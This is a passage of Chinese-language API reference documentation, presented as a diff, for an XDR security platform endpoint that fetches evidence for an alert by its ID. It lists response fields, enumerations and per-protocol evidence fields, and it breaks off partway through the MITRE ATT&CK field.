@@ -1,0 +1,1955 @@
+/api/xdr/v1/alerts/:uuid/proof
+根据告警uuId获取举证信息
+更新时间：2024-12-27 10:19:25
+OpenAPI：
+REST 参数
+参数名 	类型  	必填  	说明 	示例 	全部收缩	
+uuId
+[string]
+是	告警id		收缩	
+数据字典：
+"incident-519d8808-83c9-48db-8a18-36cc8c099650"	| [string]	| 默认值
+最小长度：
+最大长度：
+最小值：
+最大值：
+返回参数
+★
+成功 (200)
+JSON 最外层结构为：Object  切换成文本视图
+参数名 	类型  	必含  	说明 	示例 	全部收缩	
+code
+[string]
+是		"Success"	收缩	
+参数示例：
+"Success"
+最小长度：
+最大长度：
+最小值：
+最大值：
+message
+[string]
+是		"成功"	收缩	
+参数示例：
+"成功"
+最小长度：
+最大长度：
+最小值：
+最大值：
+Θdata
+[object]
+是				
+name
+[string]
+是	告警名称	”访问coinminer挖矿的通信域名“	收缩	
+参数示例：
+”访问coinminer挖矿的通信域名“
+最小长度：
+最大长度：
+最小值：
+最大值：
+uuId
+[string]
+是	告警id	"alert-2Ns9BHDGKyxtaH73qNE8Df"	收缩	
+参数示例：
+"alert-2Ns9BHDGKyxtaH73qNE8Df"
+最小长度：
+最大长度：
+最小值：
+最大值：
+severity
+[int]
+是	告警等级	50	收缩	
+数据字典：
+(0,10]	| [int]
+|
+信息
+| 默认值
+(10,30]	| [int]
+|
+低危
+(30,50]	| [int]
+|
+中危
+(50,70]	| [int]
+|
+高危
+(70,100]	| [int]
+|
+严重
+参数示例：
+50
+最小长度：
+最大长度：
+最小值：
+最大值：
+threatDefine
+[array]
+是	告警定性	[400]	收缩	
+数据字典：
+0	| [array]
+|
+未知威胁
+| 默认值
+100	| [array]
+|
+误报
+200	| [array]
+|
+业务不规范
+300	| [array]
+|
+脆弱性风险
+400	| [array]
+|
+扫描器攻击
+500	| [array]
+|
+病毒
+600	| [array]
+|
+内部测试
+700	| [array]
+|
+监管通报
+800	| [array]
+|
+攻防演练
+900	| [array]
+|
+定向攻击
+参数示例：
+[400]
+最小长度：
+最大长度：
+最小值：
+最大值：
+direction
+[int]
+是	访问方向	1	收缩	
+数据字典：
+0	| [int]
+|
+无
+| 默认值
+1	| [int]
+|
+内对外
+2	| [int]
+|
+外对内
+3	| [int]
+|
+内对内
+参数示例：
+1
+最小长度：
+最大长度：
+最小值：
+最大值：
+attackResult
+[int]
+是	攻击结果	1	收缩	
+数据字典：
+0	| [int]
+|
+尝试
+| 默认值
+1	| [int]
+|
+成功
+2	| [int]
+|
+失败
+3	| [int]
+|
+失陷
+参数示例：
+1
+最小长度：
+最大长度：
+最小值：
+最大值：
+threatSubTypeDesc
+[string]
+是	告警三级分类	"目录遍历"	收缩	
+参数示例：
+"目录遍历"
+最小长度：
+最大长度：
+最小值：
+最大值：
+stage
+[int]
+是	告警阶段	30	收缩	
+数据字典：
+0	| [int]
+|
+默认值
+| 默认值
+10	| [int]
+|
+存在风险
+20	| [int]
+|
+扫描探测
+30	| [int]
+|
+遭受攻击
+40	| [int]
+|
+主机异常
+50	| [int]
+|
+内网扩散
+60	| [int]
+|
+C&C通信
+70	| [int]
+|
+黑产牟利
+80	| [int]
+|
+窃取数据
+参数示例：
+30
+最小长度：
+最大长度：
+最小值：
+最大值：
+engineName
+[array]
+是	检测引擎	[”IOC引擎“]	收缩	
+参数示例：
+[”IOC引擎“]
+最小长度：
+最大长度：
+最小值：
+最大值：
+logCount
+[int]
+是	命中日志数	10	收缩	
+参数示例：
+10
+最小长度：
+最大长度：
+最小值：
+最大值：
+lastTime
+[long]
+是	最近发生时间(秒级时间戳)	1687960436	收缩	
+参数示例：
+1687960436
+最小长度：
+最大长度：
+最小值：
+最大值：
+srcIp
+[array]
+是	源IP	["10.74.66.33"]	收缩	
+参数示例：
+["10.74.66.33"]
+最小长度：
+最大长度：
+最小值：
+最大值：
+srcPort
+[array]
+是	源端口	[44864,56164]	收缩	
+参数示例：
+[44864,56164]
+最小长度：
+最大长度：
+最小值：
+最大值：
+dstIp
+[array]
+是	目的IP	["10.8.8.8","172.168.0.1"]	收缩	
+参数示例：
+["10.8.8.8","172.168.0.1"]
+最小长度：
+最大长度：
+最小值：
+最大值：
+dstPort
+[array]
+是	目的端口	[53]	收缩	
+参数示例：
+[53]
+最小长度：
+最大长度：
+最小值：
+最大值：
+devSourceName
+[array]
+是	设备来源	["sip (sangforsip)"]	收缩	
+参数示例：
+["sip (sangforsip)"]
+最小长度：
+最大长度：
+最小值：
+最大值：
+dealStatus
+[int]
+是	处置状态	1	收缩	
+数据字典：
+1	| [int]
+|
+待处置
+| 默认值
+2	| [int]
+|
+处置中
+3	| [int]
+|
+处置完成
+参数示例：
+1
+最小长度：
+最大长度：
+最小值：
+最大值：
+proofType
+[array]
+是	举证类型	["http", "login"]	收缩	
+数据字典：
+["http"]	| [array]	| 默认值
+["dns"]	| [array]
+["tcp"]	| [array]
+["smb"]	| [array]
+["rdp"]	| [array]
+["ssh"]	| [array]
+["ldap"]	| [array]
+["dcerpc"]	| [array]
+["socks"]	| [array]
+["redis command"]	| [array]
+["redis login"]	| [array]
+["mongo"]	| [array]
+["webmail"]	| [array]
+["mysql login"]	| [array]
+["mysql command"]	| [array]
+["sqlserver"]	| [array]
+["kerberos"]	| [array]
+["pop3"]	| [array]
+["smtp"]	| [array]
+["ftp"]	| [array]
+["telnet command"]	| [array]
+["telnet option"]	| [array]
+["virus"]	| [array]
+["exploit"]	| [array]
+["account"]	| [array]
+["threati"]	| [array]
+["bruteForce"]	| [array]
+["packet"]	| [array]
+["scan"]	| [array]
+["login"]	| [array]
+["proof list"]	| [array]
+["email"]	| [array]
+["file"]	| [array]
+["webshell"]	| [array]
+["vpn"]	| [array]
+["sas"]	| [array]
+["icmp"]	| [array]
+["oracle"]	| [array]
+["ssl"]	| [array]
+["snmp"]	| [array]
+["ntlm"]	| [array]
+["db2"]	| [array]
+["raw"]	| [array]
+["rasp"]	| [array]
+参数示例：
+["http", "login"]
+最小长度：
+最大长度：
+最小值：
+最大值：
+Θproof
+[object]
+-	根据proofType取下面对应的举证字段，比如proofType包含file时，取fileId、fileMd5、filePath等等			
+fileId
+[string]
+-	文件ID（file）		收缩	
+参数限制：
+【举证】file
+最小长度：
+最大长度：
+最小值：
+最大值：
+fileMd5
+[string]
+-	文件MD5（file）		收缩	
+参数限制：
+【举证】file
+最小长度：
+最大长度：
+最小值：
+最大值：
+filePath
+[string]
+-	文件路径（file）		收缩	
+参数限制：
+【举证】file
+最小长度：
+最大长度：
+最小值：
+最大值：
+fileSize
+[long]
+-	文件大小(KB)（file）			
+fileCreateTime
+[long]
+-	文件创建时间（file）		收缩	
+参数限制：
+【举证】file
+最小长度：
+最大长度：
+最小值：
+最大值：
+fileClass
+[int]
+-	文件一级分类（file）	2	收缩	
+参数限制：
+【举证】file
+数据字典：
+枚举【0：未分类文件、1：PE文件、2：压缩文件、4：文档文件、8：脚本文件、16：ELF文件】	| [int]	| 默认值
+参数示例：
+2
+最小长度：
+最大长度：
+最小值：
+最大值：
+fileStatus
+[int]
+-	文件信誉（file）	0	收缩	
+参数限制：
+【举证】file
+数据字典：
+文件的黑白灰状态【0：黑、1：白、2：灰】	| [int]	| 默认值
+参数示例：
+0
+最小长度：
+最大长度：
+最小值：
+最大值：
+fileSource
+[object]
+-	文件来源（file）	"http://www.sangfor.com/1.exe"	收缩	
+参数示例：
+"http://www.sangfor.com/1.exe"
+最小长度：
+最大长度：
+最小值：
+最大值：
+fileHash
+[string]
+-	文件Hash（file）			
+fileName
+[string]
+-	文件名（file）			
+fileTransProtocol
+[object]
+-	文件传输协议类型（file）	"http"	收缩	
+参数示例：
+"http"
+最小长度：
+最大长度：
+最小值：
+最大值：
+scanStartTime
+[long]
+-	扫描开始时间（scan）		收缩	
+参数限制：
+【举证】scan
+最小长度：
+最大长度：
+最小值：
+最大值：
+scanEndTime
+[long]
+-	扫描结束时间（scan）		收缩	
+参数限制：
+【举证】scan
+最小长度：
+最大长度：
+最小值：
+最大值：
+scanDuration
+[long]
+-	扫描持续时间（scan）		收缩	
+参数限制：
+【举证】scan
+最小长度：
+最大长度：
+最小值：
+最大值：
+scanType
+[int]
+-	扫描类型（scan）	1	收缩	
+参数限制：
+【举证】scan
+数据字典：
+枚举【0：快速、1：慢速、2：分布式快速、3：分布式慢速】	| [int]	| 默认值
+参数示例：
+1
+最小长度：
+最大长度：
+最小值：
+最大值：
+scanCount
+[int]
+-	扫描次数（scan）	10	收缩	
+参数限制：
+【举证】scan
+参数示例：
+10
+最小长度：
+最大长度：
+最小值：
+最大值：
+virusFamily
+[string]
+-	病毒家族（virus）		收缩	
+参数限制：
+【举证】virus
+最小长度：
+最大长度：
+最小值：
+最大值：
+virusName
+[string]
+-	病毒名称（virus）		收缩	
+参数限制：
+【举证】virus
+最小长度：
+最大长度：
+最小值：
+最大值：
+virusType
+[string]
+-	病毒类型（virus）		收缩	
+参数限制：
+【举证】virus
+最小长度：
+最大长度：
+最小值：
+最大值：
+virusLibVersion
+[string]
+-	病毒库版本（virus）		收缩	
+参数限制：
+【举证】virus
+最小长度：
+最大长度：
+最小值：
+最大值：
+bfStartTime
+[long]
+-	暴力破解开始时间（bruteForce）		收缩	
+参数限制：
+【举证】bruteForce
+最小长度：
+最大长度：
+最小值：
+最大值：
+bfEndTime
+[long]
+-	暴力破解结束时间（bruteForce）		收缩	
+参数限制：
+【举证】bruteForce
+最小长度：
+最大长度：
+最小值：
+最大值：
+bfCount
+[int]
+-	暴力破解次数（bruteForce）		收缩	
+参数限制：
+【举证】bruteForce
+最小长度：
+最大长度：
+最小值：
+最大值：
+bfIpList
+[string]
+-	暴力破解IP地址（bruteForce）	"1.1.1.1,2.2.2.2"	收缩	
+参数限制：
+【举证】bruteForce
+参数示例：
+"1.1.1.1,2.2.2.2"
+最小长度：
+最大长度：
+最小值：
+最大值：
+bfAccountList
+[array]
+-	暴力破解账号清单（bruteForce）		收缩	
+参数限制：
+【举证】bruteForce
+最小长度：
+最大长度：
+最小值：
+最大值：
+bfDuration
+[object]
+-	暴力破解持续时间（bruteForce）			
+bfType
+[int]
+-	暴力破解类型（bruteForce）			
+bfProtocol
+[string]
+-	暴力破解协议（bruteForce）			
+url
+[object]
+-	URL（webshell）		收缩	
+参数限制：
+【举证】webshell
+最小长度：
+最大长度：
+最小值：
+最大值：
+domain
+[string]
+-	访问域名（webshell）		收缩	
+参数限制：
+【举证】webshell
+最小长度：
+最大长度：
+最小值：
+最大值：
+webshellFindType
+[int]
+-	webshell发现方式（webshell）		收缩	
+参数限制：
+【举证】webshell
+最小长度：
+最大长度：
+最小值：
+最大值：
+webshellDomainRoot
+[string]
+-	根目录（webshell）		收缩	
+参数限制：
+【举证】webshell
+最小长度：
+最大长度：
+最小值：
+最大值：
+rawProofData
+[string]
+-	原始举证数据（raw）		收缩	
+参数限制：
+【举证】raw
+最小长度：
+最大长度：
+最小值：
+最大值：
+raspAppCmd
+[string]
+-	应用运行命令（rasp）		收缩	
+参数限制：
+【举证】rasp
+最小长度：
+最大长度：
+最小值：
+最大值：
+raspAppDir
+[string]
+-	应用路径（rasp）		收缩	
+参数限制：
+【举证】rasp
+最小长度：
+最大长度：
+最小值：
+最大值：
+raspAppType
+[string]
+-	应用类型（rasp）		收缩	
+参数限制：
+【举证】rasp
+最小长度：
+最大长度：
+最小值：
+最大值：
+raspAppPort
+[int]
+-	应用端口（rasp）	8081	收缩	
+参数限制：
+【举证】rasp
+参数示例：
+8081
+最小长度：
+最大长度：
+最小值：
+最大值：
+raspAppVersion
+[string]
+-	应用版本（rasp）		收缩	
+参数限制：
+【举证】rasp
+最小长度：
+最大长度：
+最小值：
+最大值：
+raspAppLanguage
+[string]
+-	应用语言（rasp）		收缩	
+参数限制：
+【举证】rasp
+最小长度：
+最大长度：
+最小值：
+最大值：
+raspPayload
+[string]
+-	payload（rasp）		收缩	
+参数限制：
+【举证】rasp
+最小长度：
+最大长度：
+最小值：
+最大值：
+raspHookPoint
+[string]
+-	函数挂载点（rasp）		收缩	
+参数限制：
+【举证】rasp
+最小长度：
+最大长度：
+最小值：
+最大值：
+raspStacktrace
+[array]
+-	堆栈信息（rasp）		收缩	
+参数限制：
+【举证】rasp
+最小长度：
+最大长度：
+最小值：
+最大值：
+raspCVEId
+[string]
+-	CVEID（rasp）		收缩	
+参数限制：
+【举证】rasp
+最小长度：
+最大长度：
+最小值：
+最大值：
+requestHead
+[string]
+-	请求头（http）			
+requestBody
+[string]
+-	请求体（http）			
+responseHead
+[string]
+-	响应头（http）			
+responseBody
+[string]
+-	响应体（http）			
+dnsQueries
+[string]
+-	DNS查询域名（dns）			
+dnsQTypes
+[string]
+-	DNS查询类型（dns）			
+dnsAnswers
+[string]
+-	DNS响应结果（dns）			
+dnsLength
+[string]
+-	DNS数据包长度（dns）			
+tcpStartState
+[int]
+-	TCP开始状态（tcp）	2	收缩	
+数据字典：
+tcp 连接第一个数据包的状态，枚举【0：未知、1：syn、2：syn-ack、3：push-ack、4：rst、5：fin、6：ack】	| [int]	| 默认值
+参数示例：
+2
+最小长度：
+最大长度：
+最小值：
+最大值：
+tcpSessionState
+[int]
+-	TCP结束状态（tcp）	4	收缩	
+数据字典：
+tcp 数据流结束时的会话状态，枚举【0：未知、1：syn、2：syn-ack、3：established、4：fin、5：reset】	| [int]	| 默认值
+参数示例：
+4
+最小长度：
+最大长度：
+最小值：
+最大值：
+tcpElapsedTime
+[long]
+-	TCP持续时间（tcp）			
+tcpUpLinkLength
+[long]
+-	上行字节数（tcp）			
+tcpUpPkts
+[long]
+-	上行数据包数（tcp）			
+tcpDownLinkLength
+[long]
+-	下行字节数（tcp）			
+tcpDownPkts
+[long]
+-	下行数据包数（tcp）			
+smbCommand
+[int]
+-	SMB命令类型（smb）			
+smbVersion
+[int]
+-	SMB协议版本（smb）			
+smbProcessId
+[int]
+-	SMB进程ID（smb）			
+smbUserId
+[int]
+-	SMB登录用户ID（smb）			
+smbArgument
+[string]
+-	SMB参数（smb）			
+smbUserName
+[string]
+-	SMB登录用户（smb）			
+smbStatus
+[int]
+-	SMB状态码（smb）			
+rdpTlsVersion
+[int]
+-	RDP-TLS版本（rdp）			
+rdpDownloadPkts
+[int]
+-	RDP下行包数（rdp）			
+rdpDownflowBits
+[int]
+-	RDP下行流量（rdp）			
+sshProtocolVersion
+[string]
+-	SSH协议版本（ssh）			
+sshClientVersion
+[string]
+-	SSH客户端版本（ssh）			
+sshServerVersion
+[string]
+-	SSH服务端版本（ssh）			
+sshEncryptionAlg
+[string]
+-	SSH加密算法（ssh）			
+sshMacAlg
+[string]
+-	SSH-MAC算法（ssh）			
+sshCompressionAlg
+[string]
+-	SSH压缩算法（ssh）			
+sshHostKey
+[string]
+-	SSH主机秘钥（ssh）			
+ldapName
+[string]
+-	LDAP登录名（ldap）			
+ldapAuth
+[string]
+-	LDAP认证密码（ldap）			
+ldapEncType
+[string]
+-	LDAP加密类型（ldap）			
+ldapAuthType
+[string]
+-	LDAP认证类型（ldap）			
+ldapReplyCode
+[int]
+-	LDAP响应码（ldap）			
+ldapSuccess
+[boolean]
+-	LDAP登录状态（ldap）			
+dcerpcEndPoint
+[string]
+-	RPC管道名（dcerpc）			
+dcerpcOpNum
+[int]
+-	RPC操作代码（dcerpc）			
+dcerpcArg
+[string]
+-	RPC命令行参数（dcerpc）			
+dcerpcResult
+[string]
+-	RPC响应结果（dcerpc）			
+dcerpcStatus
+[int]
+-	RPC状态码（dcerpc）			
+socksVer
+[int]
+-	Socks版本（socks）			
+socksMethod
+[int]
+-	Socks认证方法（socks）			
+socksUserName
+[string]
+-	Socks用户名（socks）			
+socksPassword
+[string]
+-	Socks密码（socks）			
+socksCommand
+[int]
+-	Socks请求类型（socks）			
+socksAddressType
+[int]
+-	Socks地址类型（socks）			
+socksRemoteName
+[string]
+-	Socks请求地址（socks）			
+socksPort
+[int]
+-	Socks请求端口（socks）			
+socks4Results
+[int]
+-	Socks4请求结果（socks）			
+socksResults
+[int]
+-	Socks5请求结果（socks）			
+socksBindType
+[int]
+-	Socks绑定地址类型（socks）			
+socksBindName
+[string]
+-	Socks绑定地址（socks）			
+socksBindPort
+[int]
+-	Socks绑定端口（socks）			
+redisCommandCall
+[string]
+-	Redis命令行（redis command）			
+redisCommandReply
+[string]
+-	Redis响应内容（redis command）			
+redisLogin
+[string]
+-	Redis登录账号（redis login）			
+redisPassword
+[string]
+-	Redis登录密码（redis login）			
+redisReply
+[string]
+-	Redis认证结果（redis login）			
+mongoRequest
+[string]
+-	Mongo请求信息（mongo）			
+mongoResponse
+[string]
+-	Mongo响应信息（mongo）			
+webmailFrom
+[string]
+-	WebMail发件人（webmail）			
+webmailSubject
+[string]
+-	WebMail邮件主题（webmail）			
+webmailTo
+[string]
+-	WebMail收件人（webmail）			
+webmailAttachmentFilename
+[string]
+-	WebMail附件名（webmail）			
+mysqlLoginCommand
+[string]
+-	Mysql登录命令（mysql login）			
+mysqlLoginArg
+[string]
+-	Mysql执行参数（mysql login）			
+mysqlSuccess
+[boolean]
+-	Mysql执行状态（mysql login）			
+mysqlRows
+[int]
+-	Mysql影响行数（mysql login）			
+mysqlResponse
+[string]
+-	Mysql命令响应（mysql login）			
+mysqlCommand
+[string]
+-	Mysql命令行（mysql command）			
+mysqlCommandArg
+[string]
+-	Mysql命令参数（mysql command）			
+mysqlCommandSuccess
+[boolean]
+-	Mysql命令执行状态（mysql command）			
+mysqlCommandRows
+[int]
+-	Mysql命令影响数（mysql command）			
+mysqlCommandResponse
+[string]
+-	Mysql命令执行响应（mysql command）			
+mysqlCommandQueryRows
+[int]
+-	Mysql查询行数（mysql command）			
+mysqlCommandUser
+[string]
+-	Mysql当前用户（mysql command）			
+sqlServerType
+[string]
+-	SqlServer请求类型（sqlserver）			
+sqlServerRequest
+[string]
+-	SqlServer请求命令（sqlserver）			
+sqlServerResponse
+[string]
+-	SqlServer响应内容（sqlserver）			
+krbRequestType
+[string]
+-	Kerberos请求类型（kerberos）			
+krbRequestLen
+[long]
+-	Kerberos请求长度（kerberos）			
+krbIncludePac
+[int]
+-	Kerberos特权状态（kerberos）		收缩	
+数据字典：
+是否有特权pac，枚举【-1：无特权这一项、1：有特权、0：没特权】	| [int]	| 默认值
+最小长度：
+最大长度：
+最小值：
+最大值：
+krbClientName
+[string]
+-	Kerberos登录名（kerberos）			
+krbServiceName
+[string]
+-	Kerberos服务名（kerberos）			
+krbClientRealm
+[string]
+-	Kerberos客户端名（kerberos）			
+krbServiceRealm
+[string]
+-	Kerberos服务端名（kerberos）			
+krbNetbiosName
+[string]
+-	Kerberos登录主机名（kerberos）			
+krbEType
+[string]
+-	Kerberos加密集合（kerberos）			
+krbTgtMd5
+[string]
+-	Kerberos-TGT哈希（kerberos）			
+krbTgtEtype
+[int]
+-	Kerberos-TGT加密类型（kerberos）			
+krbTicketMd5
+[string]
+-	Kerberos票据md5（kerberos）			
+krbTicketEtype
+[int]
+-	Kerberos票据加密类型（kerberos）			
+krbErrorCode
+[int]
+-	Kerberos错误码（kerberos）			
+pop3From
+[string]
+-	POP3发件人（pop3）			
+pop3Subject
+[string]
+-	POP3邮件主题（pop3）			
+pop3To
+[string]
+-	POP3收件人（pop3）			
+pop3MsgId
+[string]
+-	POP3邮件ID（pop3）			
+smtpFrom
+[string]
+-	SMTP发件人（smtp）			
+smtpSubject
+[string]
+-	SMTP邮件主题（smtp）			
+smtpTo
+[string]
+-	SMTP收件人（smtp）			
+smtpMsgId
+[string]
+-	SMTP邮件ID（smtp）			
+ftpUser
+[string]
+-	FTP用户名（ftp）			
+ftpCommand
+[string]
+-	FTP命令行（ftp）			
+ftpCommandMsg
+[string]
+-	FTP命令内容（ftp）			
+ftpReplyCode
+[int]
+-	FTP响应码（ftp）			
+ftpReplyMsg
+[string]
+-	FTP响应内容（ftp）			
+ftpConnectionType
+[string]
+-	FTP链接类型（ftp）			
+ftpCwd
+[string]
+-	FTP当前目录（ftp）			
+telnetCommandUser
+[string]
+-	Telnet用户（telnet command）			
+telnetCommandInput
+[string]
+-	Telnet命令输入（telnet command）			
+telnetCommandOutput
+[string]
+-	Telnet命令输出（telnet command）			
+telnetOpTerminalType
+[string]
+-	Telnet终端类型（telnet option）			
+telnetOpenvironment
+[string]
+-	Telnet环境变量（telnet option）			
+exploitCveId
+[string]
+-	漏洞CVE编号（exploit）			
+exploitCnnvdId
+[string]
+-	漏洞CNNVD编号（exploit）			
+userName
+[string]
+-	账号（account）			
+password
+[string]
+-	密码（account）			
+encodeAccount
+[string]
+-	账号编码内容（account）			
+encodePassword
+[string]
+-	密码编码密码（account）			
+encodeType
+[string]
+-	编码类型（account）			
+tiTag
+[string]
+-	威胁情报标签（threati）			
+tiType
+[string]
+-	威胁情报类型（threati）			
+tiIntelligence
+[string]
+-	IOC（threati）			
+packetData
+[string]
+-	数据包内容（packet）			
+loginUser
+[string]
+-	账号（login）			
+loginPassword
+[string]
+-	密码（login）			
+loginUserEncode
+[string]
+-	账号编码内容（login）			
+loginUserEncodeType
+[string]
+-	账号编码类型（login）			
+loginPwdEncode
+[string]
+-	密码编码内容（login）			
+loginPwdEncodeType
+[string]
+-	密码编码类型（login）			
+loginSuccess
+[boolean]
+-	登录成功状态（login）			
+loginReplyCode
+[int]
+-	登录状态码（login）			
+loginReplyMsg
+[string]
+-	登录返回信息（login）			
+loginType
+[string]
+-	登录类型（login）			
+pfStartTime
+[long]
+-	开始时间（proof list）			
+pfEndTime
+[long]
+-	结束时间（proof list）			
+pfDuration
+[long]
+-	持续时间（proof list）			
+pfKeyDataList
+[array]
+-	关键举证数据（proof list）			
+emailSubject
+[string]
+-	邮件主题（email）			
+emailFromAddress
+[string]
+-	邮件发送人（email）			
+emailToAddress
+[string]
+-	邮件收件人（email）			
+emailAttachment
+[string]
+-	邮件附件（email）			
+emailAttachmentMd5
+[string]
+-	邮件附件MD5（email）			
+vpnOperationType
+[string]
+-	VPN操作类型（vpn）	LOGIN/LOGOUT/ACCESS	收缩	
+参数示例：
+LOGIN/LOGOUT/ACCESS
+最小长度：
+最大长度：
+最小值：
+最大值：
+vpnVirtualIp
+[string]
+-	VPN虚拟IP（vpn）	"1.1.1.1/::1"	收缩	
+参数示例：
+"1.1.1.1/::1"
+最小长度：
+最大长度：
+最小值：
+最大值：
+vpnUsername
+[string]
+-	VPN账号（vpn）	"sangfor"	收缩	
+参数示例：
+"sangfor"
+最小长度：
+最大长度：
+最小值：
+最大值：
+vpnResource
+[string]
+-	VPN资源名称（vpn）	"办公系统"	收缩	
+参数示例：
+"办公系统"
+最小长度：
+最大长度：
+最小值：
+最大值：
+vpnSuccess
+[int]
+-	VPN状态（vpn）	1	收缩	
+数据字典：
+是否成功，枚举【0：未知、1：成功、2：失败】	| [int]	| 默认值
+参数示例：
+1
+最小长度：
+最大长度：
+最小值：
+最大值：
+sasUsername
+[string]
+-	堡垒机帐号（sas）	"sangfor"	收缩	
+参数示例：
+"sangfor"
+最小长度：
+最大长度：
+最小值：
+最大值：
+sasAccount
+[string]
+-	堡垒机资源帐号（sas）	"root"	收缩	
+参数示例：
+"root"
+最小长度：
+最大长度：
+最小值：
+最大值：
+sasResource
+[string]
+-	堡垒机资源名称（sas）	"办公系统"	收缩	
+参数示例：
+"办公系统"
+最小长度：
+最大长度：
+最小值：
+最大值：
+sasSuccess
+[int]
+-	堡垒机状态（sas）	1	收缩	
+数据字典：
+是否成功，枚举【0：未知、1：成功、2:失败】	| [int]	| 默认值
+参数示例：
+1
+最小长度：
+最大长度：
+最小值：
+最大值：
+sasOperationType
+[string]
+-	堡垒机操作类型（sas）	LOGIN/LOGOUT/ACCESS/EXEC	收缩	
+参数示例：
+LOGIN/LOGOUT/ACCESS/EXEC
+最小长度：
+最大长度：
+最小值：
+最大值：
+sasCommand
+[string]
+-	堡垒机执行命令（sas）	"ls"	收缩	
+参数示例：
+"ls"
+最小长度：
+最大长度：
+最小值：
+最大值：
+db2Cmd
+[string]
+-	DB2命令（db2）	"login"	收缩	
+参数示例：
+"login"
+最小长度：
+最大长度：
+最小值：
+最大值：
+db2Arg
+[string]
+-	DB2参数（db2）	"{"db_name": "test", "security_mec": 3}"	收缩	
+参数示例：
+"{"db_name": "test", "security_mec": 3}"
+最小长度：
+最大长度：
+最小值：
+最大值：
+db2Success
+[boolean]
+-	DB2结果（db2）	TRUE	收缩	
+参数限制：
+命令是否执行成功
+参数示例：
+TRUE
+最小长度：
+最大长度：
+最小值：
+最大值：
+db2Response
+[string]
+-	DB2响应内容（db2）	"{"security_mec": 3, "srv_name": "DB2", "srv_version": "SQL11050"}"	收缩	
+参数示例：
+"{"security_mec": 3, "srv_name": "DB2", "srv_version": "SQL11050"}"
+最小长度：
+最大长度：
+最小值：
+最大值：
+icmpType
+[int]
+-	ICMP类型（icmp）	0	收缩	
+数据字典：
+枚举【0、8、3、11、5、9、10】	| [int]	| 默认值
+参数示例：
+0
+最小长度：
+最大长度：
+最小值：
+最大值：
+icmpCode
+[string]
+-	ICMP Code（icmp）	0	收缩	
+参数示例：
+0
+最小长度：
+最大长度：
+最小值：
+最大值：
+icmpExtra
+[string]
+-	ICMP额外数据（icmp）			
+oracleCmd
+[string]
+-	Oracle命令（oracle）	"login"	收缩	
+参数示例：
+"login"
+最小长度：
+最大长度：
+最小值：
+最大值：
+oracleArgs
+[string]
+-	Oracle参数（oracle）			
+oracleSuccess
+[boolean]
+-	Oracle结果（oracle）	TRUE	收缩	
+参数示例：
+TRUE
+最小长度：
+最大长度：
+最小值：
+最大值：
+oracleRows
+[int]
+-	Oracle影响行数（oracle）	0	收缩	
+参数示例：
+0
+最小长度：
+最大长度：
+最小值：
+最大值：
+oracleResponse
+[string]
+-	Oracle响应内容（oracle）	{"login_user":"C##OT","app_name":"plsqldev.exe","host_name":"DESKTOP-6VO8Q03","sid_name":"oracle"}	收缩	
+参数示例：
+{"login_user":"C##OT","app_name":"plsqldev.exe","host_name":"DESKTOP-6VO8Q03","sid_name":"oracle"}
+最小长度：
+最大长度：
+最小值：
+最大值：
+oracleQueryRows
+[int]
+-	Oracle查询行数（oracle）	1122	收缩	
+参数示例：
+1122
+最小长度：
+最大长度：
+最小值：
+最大值：
+sslUpPks
+[long]
+-	SSL上行包数（ssl）			
+sslDownPks
+[long]
+-	SSL下行包数（ssl）			
+sslUpSize
+[long]
+-	SSL上行数据大小（ssl）			
+sslDownSize
+[long]
+-	SSL下行数据大小（ssl）			
+sslHandshakeSuccess
+[boolean]
+-	SSL握手状态（ssl）			
+sslSessionTime
+[long]
+-	SSL会话时长（ssl）			
+sslCliVersion
+[int]
+-	SSL客户端版本（ssl）			
+sslSvrVersion
+[int]
+-	SSL服务端版本（ssl）			
+sslCliRandom
+[string]
+-	SSL客户端随机数（ssl）			
+sslSvrRandom
+[string]
+-	SSL服务端随机数（ssl）			
+sslCliCipherSuites
+[string]
+-	SSL客户端加密套件（ssl）			
+sslSvrCipherSuite
+[int]
+-	SSL服务端加密套件（ssl）			
+sslCliCompressions
+[string]
+-	SSL客户端压缩算法（ssl）			
+sslSvrCompression
+[int]
+-	SSL服务端压缩算法（ssl）			
+sslCliSessionId
+[string]
+-	SSL客户端Session-ID（ssl）			
+sslSvrSessionId
+[string]
+-	SSL服务端Session-ID（ssl）			
+sslCliHeloExt
+[string]
+-	SSL客户端Hello包内容（ssl）			
+sslSvrHeloExt
+[string]
+-	SSL服务端Hello包内容（ssl）			
+sslNewSessionTicket
+[string]
+-	SSL票据（ssl）			
+sslTicketLifetime
+[long]
+-	SSL票据有效时间（ssl）			
+sslCliKeyLen
+[int]
+-	SSL公钥长度（ssl）			
+sslCliCert
+[array]
+-	SSL客户端证书(json数组)（ssl）			
+sslSvrCert
+[array]
+-	SSL服务端证书(json数组)（ssl）			
+snmpVersion
+[int]
+-	SNMP协议版本（snmp）	1	收缩	
+参数示例：
+1
+最小长度：
+最大长度：
+最小值：
+最大值：
+snmpType
+[int]
+-	SNMP报文类型（snmp）	2	收缩	
+参数示例：
+2
+最小长度：
+最大长度：
+最小值：
+最大值：
+snmpHeader
+[string]
+-	SNMP头部内容（snmp）	{"community":"public","error_index":0,"error_status":0,"request_id":1997930667}	收缩	
+参数示例：
+{"community":"public","error_index":0,"error_status":0,"request_id":1997930667}
+最小长度：
+最大长度：
+最小值：
+最大值：
+snmpVariableBindings
+[string]
+-	SNMP变量列表（snmp）			
+ntlmUserName
+[string]
+-	NTLM账号（ntlm）			
+ntlmHostName
+[string]
+-	NTLM主机名（ntlm）			
+ntlmDomainName
+[string]
+-	NTLM域名（ntlm）			
+ntlmSuccess
+[boolean]
+-	NTLM结果（ntlm）		收缩	
+数据字典：
+认证结果，枚举【0：成功、1：失败】	| [boolean]	| 默认值
+最小长度：
+最大长度：
+最小值：
+最大值：
+ΘoriginalAlert
+[object]
+-	E侧进程链原始告警举证			
+dataType
+[string]
+-	举证类型	"NDR"	收缩	
+参数示例：
+"NDR"
+最小长度：
+最大长度：
+最小值：
+最大值：
+engineName
+[string]
+-	引擎名称	"IOA"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"IOA"
+最小长度：
+最大长度：
+最小值：
+最大值：
+srcIp
+[string]
+-	源IP	"55.55.55.55"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"55.55.55.55"
+最小长度：
+最大长度：
+最小值：
+最大值：
+dstIp
+[string]
+-	目的IP	"222.11.1.1"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"222.11.1.1"
+最小长度：
+最大长度：
+最小值：
+最大值：
+mitreId
+[array]
+-	ATTCK战技术	[ "TA0011.T1104" ]	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
